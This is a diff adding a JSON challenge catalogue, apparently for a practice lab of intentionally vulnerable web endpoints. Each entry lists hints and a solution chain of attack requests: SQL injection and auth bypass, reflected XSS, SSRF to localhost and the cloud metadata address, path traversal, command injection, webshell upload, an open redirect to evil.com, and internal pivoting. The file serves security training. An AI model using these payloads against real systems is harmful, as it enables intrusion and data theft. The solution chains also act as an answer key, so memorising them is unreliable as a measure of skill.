@@ -1,0 +1,16 @@
+[
+  {"id":"Z1_01","zone":1,"title":"SQL 注入 · Union/OR 提取","type":"sqli","endpoint":"/ch/z1_01","method":"GET","points":100,"hint":"id 参数存在注入, 试试 ?id=0 OR 1=1 或 UNION","chain":["GET /ch/z1_01?id=0 OR 1=1"]},
+  {"id":"Z1_02","zone":1,"title":"反射型 XSS","type":"xss","endpoint":"/ch/z1_02","method":"GET","points":100,"hint":"name 参数反射, 注入 <script> 触发","chain":["GET /ch/z1_02?name=<script>alert(1)</script>"]},
+  {"id":"Z1_03","zone":1,"title":"SSRF · 读取内部 FLAG","type":"ssrf","endpoint":"/ch/z1_03","method":"GET","points":100,"hint":"?url= 服务端请求, 指向内部 /__internal/flagz","chain":["GET /ch/z1_03?url=http://127.0.0.1:LABPORT/__internal/flagz"]},
+  {"id":"Z1_04","zone":1,"title":"路径遍历 · 读 secret","type":"lfi","endpoint":"/ch/z1_04","method":"GET","points":100,"hint":"?file= 可跳出 public, 读 ../secret/flag.txt","chain":["GET /ch/z1_04?file=../secret/flag.txt"]},
+  {"id":"Z1_05","zone":1,"title":"命令注入 · RCE","type":"cmdi","endpoint":"/ch/z1_05","method":"GET","points":100,"hint":"host 参数拼接命令, 用 ; 注入","chain":["GET /ch/z1_05?host=127.0.0.1;cat flag"]},
+  {"id":"Z1_06","zone":1,"title":"文件上传 · Webshell","type":"upload","endpoint":"/ch/z1_06","method":"POST","points":100,"hint":"POST json {filename,content}, 危险扩展名或 webshell 内容","chain":["POST /ch/z1_06 {\"filename\":\"x.php\",\"content\":\"<?php\"}"]},
+  {"id":"Z1_07","zone":1,"title":"缺失授权 · 未授权 admin","type":"missing_auth","endpoint":"/ch/z1_07","method":"GET","points":100,"hint":"本应认证, 实际任何人可访问","chain":["GET /ch/z1_07"]},
+  {"id":"Z1_08","zone":1,"title":"开放重定向","type":"open_redirect","endpoint":"/ch/z1_08","method":"GET","points":100,"hint":"?next=//evil.com 触发外部跳转","chain":["GET /ch/z1_08?next=//evil.com"]},
+  {"id":"Z2_01","zone":2,"title":"云元数据 · IMDS 暴露","type":"cloud_meta","endpoint":"/ch/z2_01","method":"GET","points":150,"hint":"?url= 指向 169.254.169.254/latest/meta-data","chain":["GET /ch/z2_01?url=http://169.254.169.254/latest/meta-data/"]},
+  {"id":"Z2_02","zone":2,"title":"AI 基础设施配置泄露","type":"ai_infra_leak","endpoint":"/ch/z2_02","method":"GET","points":150,"hint":"直接访问暴露的 AI 服务配置/密钥","chain":["GET /ch/z2_02"]},
+  {"id":"Z3_01","zone":3,"title":"链式 · SSRF→内部 admin","type":"chain_ssrf","endpoint":"/ch/z3_01_admin","method":"GET","points":200,"hint":"先取 token 再访问 admin","chain":["GET /ch/z3_01_token","GET /ch/z3_01_admin?token=TKN_Z3A_8f3c"]},
+  {"id":"Z3_02","zone":3,"title":"链式 · XSS 提权→admin","type":"chain_xss","endpoint":"/ch/z3_02_admin","method":"GET","points":200,"hint":"先用 XSS 设 admin cookie, 再访问 admin","chain":["GET /ch/z3_02_set?x=<script>","GET /ch/z3_02_admin (带 Cookie admin=1)"]},
+  {"id":"Z3_03","zone":3,"title":"链式 · SQLi 认证绕过→flag","type":"chain_sqli","endpoint":"/ch/z3_03_flag","method":"GET","points":200,"hint":"认证绕过取 session, 再取 flag","chain":["GET /ch/z3_03_login?user=admin' OR '1'='1&pwd=x","GET /ch/z3_03_flag?session=SES_Z3_77b"]},
+  {"id":"Z4_01","zone":4,"title":"内网推演 · 暴露主机→内网服务","type":"pivot","endpoint":"/ch/z4_01_svc","method":"GET","points":250,"hint":"先发现内网主机, 再访问内网服务","chain":["GET /ch/z4_01_hint","GET /ch/z4_01_svc?host=10.13.37.5"]}
+]
